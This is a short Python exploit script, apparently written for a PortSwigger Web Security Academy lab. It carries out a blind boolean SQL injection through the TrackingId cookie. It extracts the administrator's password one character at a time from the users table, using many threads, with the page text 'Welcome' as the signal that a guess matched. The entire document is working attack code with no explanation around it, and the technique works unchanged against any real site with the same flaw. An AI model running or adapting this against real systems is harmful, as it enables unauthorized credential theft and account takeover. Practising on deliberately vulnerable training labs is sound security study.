import requests
import string
import threading

url = "https://0a39009a037cdaac83610c3600580071.web-security-academy.net/"
session_cookie = "R2tAbsZpfsbq0czZV7vBFf05wW7B4ftl"
base_tracking_id = "xEzQTRws0y07JMHq"
chars = string.ascii_lowercase + string.digits
password = ['?'] * 20
lock = threading.Lock()

def check_char(pos, char):
    tracking_id = f"{base_tracking_id}'+and+(select+substring+(password,{pos},1)+from+users+where+username+%3d'administrator')%3d'{char}'--"
    cookies = {
        "TrackingId": tracking_id,
        "session": session_cookie
    }
    try:
        r = requests.get(url, cookies=cookies, timeout=10)
        if "Welcome" in r.text:
            with lock:
                password[pos-1] = char
                print(f"[+] Position {pos}: '{char}' -> {''.join(password)}")
    except Exception as e:
        pass

threads = []
for pos in range(1, 21):
    for char in chars:
        t = threading.Thread(target=check_char, args=(pos, char))
        threads.append(t)

batch_size = 50
for i in range(0, len(threads), batch_size):
    batch = threads[i:i+batch_size]
    for t in batch:
        t.start()
    for t in batch:
        t.join()

print("\n[*] Password:", ''.join(password))